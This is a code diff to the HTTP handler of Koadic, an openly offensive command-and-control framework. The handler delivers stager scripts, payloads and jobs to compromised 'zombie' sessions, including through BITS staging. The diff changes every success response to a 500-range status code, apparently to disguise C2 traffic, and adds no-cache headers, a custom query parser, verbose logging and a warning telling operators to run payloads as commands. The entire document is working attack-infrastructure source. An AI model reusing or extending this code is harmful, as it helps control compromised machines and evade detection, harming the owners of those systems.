@@ -1,6 +1,6 @@
 from socketserver import ThreadingMixIn
 from http.server import BaseHTTPRequestHandler, HTTPServer
-from urllib.parse import parse_qs
+#from urllib.parse import parse_qs
 
 import cgi
 import socket
@@ -28,6 +28,9 @@ class Handler(BaseHTTPRequestHandler):
         for key, value in headers.items():
             self.send_header(key, value)
 
+        self.send_header('Cache-Control', 'no-store, max-age=0')
+        self.send_header('If-Modified-Since', '0')
+
         self.end_headers()
 
         # python is so utterly incapable that we have to write CS 101 socket
@@ -51,7 +54,7 @@ class Handler(BaseHTTPRequestHandler):
         headers = {}
         headers['Content-Type'] = 'application/octet-stream'
         headers['Content-Length'] = len(fdata)
-        self.reply(200, fdata, headers)
+        self.reply(500, fdata, headers)
 
     def get_header(self, header, default=None):
         if header in self.headers:
@@ -107,19 +110,39 @@ class Handler(BaseHTTPRequestHandler):
 
     def find_stager(self, splitted):
         self.endpoint = splitted[0].split("/")[1].split(".")[0]
+        self.shell.print_verbose(f"handler::find_stager() - endpoint identified = {self.endpoint}")
 
         if self.endpoint not in self.shell.stagers[self.port]:
+            self.shell.print_verbose(f"handler::find_stager() - could not find a listener on port {self.port} for this endpoint")
             return False
 
         self.stager = self.shell.stagers[self.port][self.endpoint]
         self.options = copy.deepcopy(self.stager.options)
         return True
 
+    def parse_qs(self, qs):
+        params = {}
+        if len(qs) < 2:
+            return params
+        for p in qs[1].split(';'):
+            if not p:
+                continue
+            pp = p.split('=', 1)
+            if len(pp) != 2:
+                continue
+            pk = pp[0]
+            pv = pp[1]
+            if len(pv):
+                params[pk] = [pv]
+        return params
+
     def parse_params(self):
+        self.shell.print_verbose(f"handler::parse_params() - path = {self.path}")
         splitted = self.path.split("?")
         if not self.find_stager(splitted):
             return False
-        self.get_params = parse_qs(splitted[1]) if len(splitted) > 1 else {}
+        #self.get_params = parse_qs(splitted[1]) if len(splitted) > 1 else {}
+        self.get_params = self.parse_qs(splitted)
 
         sessionname = self.options.get("SESSIONNAME")
 
@@ -150,6 +173,11 @@ class Handler(BaseHTTPRequestHandler):
 
         elif self.shell.continuesession:
             self.session = self.shell.continuesession
+
+        if self.headers['user-agent']:
+            self.shell.print_verbose(f"handler::parse_params() - user_agent = {self.headers['user-agent']}")
+            if 'compatible' not in self.headers['user-agent'] and 'Microsoft BITS' not in self.headers['user-agent']:
+                self.shell.print_warning("Are you running this payload from a browser? Koadic payloads are not meant to be launched from a browser. If a zombie isn't staging and you're seeing this warning, please don't post a ticket on Github. Run the FULL payload as a command.")
 
         if self.headers['host']:
             self.shell.print_verbose(f"handler::parse_params() - Host header present: {self.headers['host']}")
@@ -240,7 +268,7 @@ class Handler(BaseHTTPRequestHandler):
                     for o in old_options.options:
                         plugin.options.set(o.name, o.value)
 
-                return self.reply(200)
+                return self.reply(500)
 
 
             return self.handle_report()
@@ -252,7 +280,7 @@ class Handler(BaseHTTPRequestHandler):
         self.options.set("JOBKEY", "stage")
         template = self.options.get("_FORKTEMPLATE_")
         data = self.linter.post_process_script(self.options.get("_STAGE_"), template, self.options, self.session)
-        self.reply(200, data)
+        self.reply(500, data)
 
     def handle_oneshot(self):
         plugin = self.shell.plugins[self.options.get("MODULE")]
@@ -264,7 +292,7 @@ class Handler(BaseHTTPRequestHandler):
             template = self.options.get("_STAGETEMPLATE_")
             script = self.linter.post_process_script(script, template, self.options, self.session)
 
-            self.reply(200, script)
+            self.reply(500, script)
             return
 
         j.ip = str(self.client_address[0])
@@ -276,20 +304,20 @@ class Handler(BaseHTTPRequestHandler):
         template = self.options.get("_STAGETEMPLATE_")
         script = self.linter.post_process_script(script, template, self.options, self.session)
 
-        self.reply(200, script)
+        self.reply(500, script)
 
     def handle_new_session(self):
         self.shell.print_verbose("handler::handle_new_session()")
         self.init_session()
         template = self.options.get("_STAGETEMPLATE_")
         data = self.linter.post_process_script(self.options.get("_STAGE_"), template, self.options, self.session)
-        self.reply(200, data)
+        self.reply(500, data)
 
     def handle_dont_stage(self):
         self.shell.print_verbose("handler::handle_dont_stage()")
         template = self.options.get("_STAGETEMPLATE_")
         data = self.linter.post_process_script(b"Koadic.exit();", template, self.options, self.session)
-        self.reply(200, data)
+        self.reply(500, data)
 
     def handle_bitsadmin_stage(self):
         rangeheader = self.get_header('range')
@@ -314,13 +342,13 @@ class Handler(BaseHTTPRequestHandler):
         script = self.job.payload()
         template = self.options.get("_FORKTEMPLATE_")
         script = self.linter.post_process_script(script, template, self.options, self.session)
-        self.reply(200, script)
+        self.reply(500, script)
 
     def handle_work(self):
         count = 0
         while True:
             if self.session.killed:
-                return self.reply(500, "");
+                return self.reply(599, "");
 
             job = self.session.get_created_job()
             if job is not None:
@@ -335,13 +363,13 @@ class Handler(BaseHTTPRequestHandler):
             self.session.update_active()
             count += 1
             if count > 600:
-                self.reply(201, "")
+                self.reply(501, "")
                 return
 
         job.receive()
 
         # hack to tell us to fork 32 bit
-        status = 202 if job.fork32Bit else 201
+        status = 502 if job.fork32Bit else 501
 
         self.reply(status, job.key.encode())
 
@@ -354,7 +382,7 @@ class Handler(BaseHTTPRequestHandler):
             errdesc = self.get_header('errdesc', 'No Description')
             errname = self.get_header('errname', 'Error')
             self.job.error(errno, errdesc, errname, data)
-            self.reply(200)
+            self.reply(500)
             return
 
         self.job.report(self, data)
